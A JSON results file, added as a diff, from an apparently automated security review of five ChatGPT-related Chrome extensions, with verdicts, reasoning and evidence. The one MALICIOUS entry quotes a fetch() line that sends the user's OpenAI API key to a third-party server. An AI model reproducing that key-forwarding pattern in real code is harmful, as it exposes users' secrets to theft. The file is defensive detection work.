@@ -1,0 +1,365 @@
+{
+  "job_name": "batches/sfcbd3n9ssvrd9osdpbb8ev94rqjx89hyd4l",
+  "dataset": "candidates",
+  "retrieved_at": "2026-01-30T20:56:34.922250",
+  "validations": [
+    {
+      "extension_id": "nafdjcnfmdcdnebjhehhohfaaffdlkon",
+      "verdict": "MALICIOUS",
+      "confidence": 1.0,
+      "reasoning": "The extension is classified as MALICIOUS due to active credential harvesting. While it performs its stated function of generating tweet responses, it requires users to input their private OpenAI API key. Instead of communicating directly with OpenAI's official API (api.openai.com), the extension sends the user's secret key as a plaintext query parameter to a private server controlled by the developer (purplepanda.be). This practice allows the developer to collect and potentially misuse user API keys, which have direct financial value. There is no technical necessity to route secret API keys through a third-party proxy, and this behavior is not disclosed to the user.",
+      "recommendation": "BLOCK",
+      "key_concerns": [
+        "Exfiltration of private OpenAI API keys to an unauthorized third-party domain.",
+        "The use of GET requests to transmit secrets, which exposes the keys in server logs and browser history.",
+        "Lack of transparency regarding the man-in-the-middle architecture for AI requests."
+      ],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": "OpenAI API Key (user-provided credential)",
+          "processing_method": "The key is retrieved from local storage and appended as a plaintext query parameter to a GET request.",
+          "destination_domain": "functions.purplepanda.be",
+          "code_evidence": "fetch(\"https://functions.purplepanda.be/twittergpt/api/gpt-api-new.php?tweetContent=\" + encodeURI(tweetText) + \"&ws=\" + tweetStyle + \"&tweetID=\" + tweetID + \"&api-key=\" + userApiKey)"
+        },
+        "dual_purpose": {
+          "stated_purpose": "Respond to tweets with ChatGPT",
+          "hidden_functionality": "Credential harvesting of user OpenAI API keys via a third-party intermediary server.",
+          "code_evidence": "popup.js Line 116 and popup.old.js Line 83"
+        },
+        "credential_theft": {
+          "capture_mechanism": "Users are prompted to enter their 'API Key' into an input field (id='api-key-input') which is then stored in chrome.storage.local.",
+          "transmission_target": "https://functions.purplepanda.be/twittergpt/api/gpt-api-new.php",
+          "code_evidence": "chrome.storage.local.get([\"apiKey\"]).then((result) => { ... userApiKey = result.apiKey; ... });"
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "twitter.com",
+          "clients2.google.com"
+        ],
+        "requires_investigation": [
+          "functions.purplepanda.be"
+        ],
+        "informational_only": []
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "CREDENTIAL_STORAGE",
+          "usage": "MALICIOUS",
+          "justification": "While storing an API key is necessary for functionality, storing it specifically to facilitate exfiltration to a non-OpenAI domain is malicious."
+        },
+        {
+          "pattern": "FETCH",
+          "usage": "MALICIOUS",
+          "justification": "Used to send the user's private OpenAI API key to a third-party server (purplepanda.be) rather than the official OpenAI API endpoint."
+        },
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Used to parse the tweet content from the Twitter DOM, which is consistent with the stated functionality."
+        }
+      ],
+      "token_usage": {
+        "prompt": 5951,
+        "candidates": 866,
+        "total": 8212
+      }
+    },
+    {
+      "extension_id": "ljfnhokapbmbchbfpgdkedekmfeodoie",
+      "verdict": "SAFE",
+      "confidence": 1.0,
+      "reasoning": "After reviewing the source code, all functionality is transparent and directly serves the stated purpose of providing RTL support for ChatGPT. The content script injects a custom font ('Estedad') from a font API, which is common for Farsi/Arabic localization. The background script only handles installation/update redirects to the author's site. The popup manages a simple toggle state using chrome.storage and injects helper scripts (addContent/removeContent) to modify the DOM for RTL support. There is no evidence of data collection, exfiltration, or unauthorized background network activity.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "RTL language support for ChatGPT (Farsi/Arabic)",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://chatgpt.com/*",
+          "https://chat.openai.com/*",
+          "https://v1.fontapi.ir"
+        ],
+        "requires_investigation": [],
+        "informational_only": [
+          "https://rastegar.info/chatgpt-rtl-support/"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "NETWORK_ENDPOINT",
+          "usage": "LEGITIMATE",
+          "justification": "The endpoints in background.js are used with chrome.tabs.create to open a welcome/thank you page upon installation and a changelog page upon update. This is standard developer practice."
+        },
+        {
+          "pattern": "STORAGE / CHROME_STORAGE",
+          "usage": "LEGITIMATE",
+          "justification": "Used in popup.js to store and retrieve the user's preference for whether the RTL styling is toggled 'on' or 'off'."
+        },
+        {
+          "pattern": "TABS_ACCESS",
+          "usage": "LEGITIMATE",
+          "justification": "Used to verify if the active tab is ChatGPT so the extension can show a warning if the user tries to use the popup on an unsupported website."
+        },
+        {
+          "pattern": "DOM / INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Used in the extension's own popup to inject static HTML messages and emojis. No external or untrusted data is being passed to innerHTML."
+        }
+      ],
+      "token_usage": {
+        "prompt": 3855,
+        "candidates": 688,
+        "total": 5443
+      }
+    },
+    {
+      "extension_id": "dfhfeifekpgapdlhfakecbbinnnfoohh",
+      "verdict": "SAFE",
+      "confidence": 1.0,
+      "reasoning": "The analysis of the source code confirms that the extension is a legitimate implementation of a ChatGPT assistant for Google Colab. The background.js script correctly handles authentication with OpenAI by fetching the session token and communicates with the official backend-api/conversation endpoint. The network activity is restricted to openai.com as declared in the manifest. The content-script.js uses standard DOM manipulation (MutationObserver) to integrate UI elements into Colab. While the code is bundled and minified (using libraries like Preact, highlight.js, and react-markdown), there is no evidence of data exfiltration, credential theft, or hidden malicious payloads. The domain 'githubtocolab.com' found in the code is a known utility for opening GitHub-hosted notebooks in Colab, aligning with the extension's target audience.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "AI/ChatGPT assistant for Google Colab and GitHub",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://chat.openai.com",
+          "https://colab.research.google.com",
+          "https://github.com",
+          "https://githubtocolab.com"
+        ],
+        "requires_investigation": [],
+        "informational_only": [
+          "https://github.com/ali-h-kudeir/ChatGPT-Google-Colab",
+          "https://twitter.com/ali_h_kudeir",
+          "https://www.producthunt.com/products/chatgpt-for-google-colab/",
+          "https://github.com/highlightjs/highlight.js/wiki/security"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "FETCH",
+          "usage": "LEGITIMATE",
+          "justification": "The background script uses fetch to interact with the OpenAI API (session and conversation endpoints) to retrieve ChatGPT responses, which is the core functionality of the extension."
+        },
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Used within the content script to render the ChatGPT interface and formatted markdown responses within the Google Colab DOM."
+        },
+        {
+          "pattern": "MUTATION_OBSERVER",
+          "usage": "LEGITIMATE",
+          "justification": "Used to monitor the Google Colab interface for the creation of code cells or specific UI elements to inject the 'Ask ChatGPT' buttons."
+        },
+        {
+          "pattern": "EVAL",
+          "usage": "LEGITIMATE",
+          "justification": "The eval pattern appears in the bundled content-script.js which contains large libraries like highlight.js and react-markdown. This is typical for bundled library code and does not show evidence of executing external or obfuscated payloads."
+        }
+      ],
+      "token_usage": {
+        "prompt": 125031,
+        "candidates": 814,
+        "total": 127350
+      }
+    },
+    {
+      "extension_id": "gadbpecoinogdkljjbjffmiijpebooce",
+      "verdict": "SAFE",
+      "confidence": 0.9,
+      "reasoning": "The extension is a standard implementation of an 'AI Search' assistant. It works by monitoring search engine pages and displaying responses from either ChatGPT (via a session-based iframe/API) or Hugging Face (via a hardcoded API token). Analysis of 'bg.js' shows that the background script facilitates the streaming of chat responses from the Hugging Face inference endpoint using the Meta-Llama-3-8B-Instruct model. No evidence was found of data exfiltration to non-AI-related domains. While the extension requests broad permissions ('<all_urls>'), this is a common requirement for search assistants that support multiple global versions of Google, Bing, and other search engines. The hardcoded Hugging Face token (hf_...) is a developer-provided key used to power the extension's default AI features and does not represent a threat to the user.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "AI/ChatGPT assistant providing AI responses alongside search results.",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://chat.openai.com",
+          "https://huggingface.co",
+          "https://api-inference.huggingface.co"
+        ],
+        "requires_investigation": [],
+        "informational_only": [
+          "https://github.com/wong2/chat-gpt-google-extension",
+          "https://www.google.com",
+          "https://www.bing.com",
+          "https://duckduckgo.com"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "FETCH (chat.openai.com/api/auth/session)",
+          "usage": "LEGITIMATE",
+          "justification": "Used to check the user's authentication status with OpenAI to determine if the ChatGPT session is active."
+        },
+        {
+          "pattern": "NETWORK_ENDPOINT (huggingface.co)",
+          "usage": "LEGITIMATE",
+          "justification": "The extension uses the Hugging Face Inference API as a secondary AI provider (specifically for Llama-3 models) to fulfill user queries."
+        },
+        {
+          "pattern": "MUTATION_OBSERVER",
+          "usage": "LEGITIMATE",
+          "justification": "Used to detect when a search engine's results page is rendered so the extension can inject the AI response sidebar."
+        },
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Used within the popup and content scripts to render the HTML for the AI response UI."
+        }
+      ],
+      "token_usage": {
+        "prompt": 84245,
+        "candidates": 770,
+        "total": 87631
+      }
+    },
+    {
+      "extension_id": "doalefhfhoencpklgkmabcakndkniddl",
+      "verdict": "SAFE",
+      "confidence": 0.95,
+      "reasoning": "After reviewing the source code, the extension appears to be a standard implementation of an AI assistant. The static analysis findings are predominantly 'noise' generated by production-grade libraries: Vue 3, Element Plus, and highlight.js. The extension uses the Kodepay SDK for monetization and subscription management, which explains the presence of 'kodepay.io' and the associated Alibaba Cloud (Aliyuncs) logging endpoints. The content script correctly limits its communication to the Kodepay domain for payment processing. There is no evidence of user data exfiltration beyond the necessary interactions with the 'chatbulb.ai' backend to facilitate the AI chat functionality. The requested host permission (*://*/*) is typical for extensions that need to provide contextual AI assistance based on the current page content.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "AI/ChatGPT assistant providing a sidebar for interactions.",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "chatbulb.ai",
+          "kodepay.io",
+          "api.kodepay.io",
+          "ipinfo.io",
+          "element-plus.org"
+        ],
+        "requires_investigation": [],
+        "informational_only": [
+          "kodepay-us.us-west-1.log.aliyuncs.com",
+          "transmart.qq.com",
+          "api.remaker.ai",
+          "github.com/highlightjs/highlight.js/wiki/security"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Used by the Vue.js framework (Element Plus) and the highlight.js library included in the bundle for rendering UI components and syntax-highlighted code blocks."
+        },
+        {
+          "pattern": "NETWORK_ENDPOINT (Aliyuncs)",
+          "usage": "LEGITIMATE",
+          "justification": "This endpoint (kodepay-us.us-west-1.log.aliyuncs.com) is part of the Kodepay SDK's telemetry and error logging system, used to track transaction success/failure and SDK performance."
+        },
+        {
+          "pattern": "MUTATION_OBSERVER",
+          "usage": "LEGITIMATE",
+          "justification": "Standard usage within the Element Plus UI library and the Vite 'modulepreload' polyfill to manage DOM updates and asset loading."
+        },
+        {
+          "pattern": "KEYBOARD_LISTENER",
+          "usage": "LEGITIMATE",
+          "justification": "Used for standard UI interactions, such as closing modals with the Escape key or handling shortcuts within the AI chat interface."
+        }
+      ],
+      "token_usage": {
+        "prompt": 124394,
+        "candidates": 801,
+        "total": 126545
+      }
+    }
+  ],
+  "summary": {
+    "MALICIOUS": 1,
+    "SUSPICIOUS": 0,
+    "SAFE": 4,
+    "NEED_MORE_FILES": 0,
+    "ERROR": 0
+  },
+  "detailed_stats": {
+    "high_risk_validated_malicious": 1,
+    "high_risk_validated_suspicious": 0,
+    "high_risk_validated_safe": 4,
+    "need_more_files_extensions": []
+  },
+  "pre_validation_stats": {
+    "total_critical_findings": 172,
+    "total_high_findings": 1042,
+    "extensions_with_suspicious_domains": 96
+  },
+  "thesis_stats": {
+    "false_positive_rate": 0.8,
+    "true_positive_rate": 0.2,
+    "malicious_detection_rate": 0.2
+  },
+  "token_usage": {
+    "prompt_tokens": 343476,
+    "candidate_tokens": 3939,
+    "total_tokens": 355181
+  }
+}
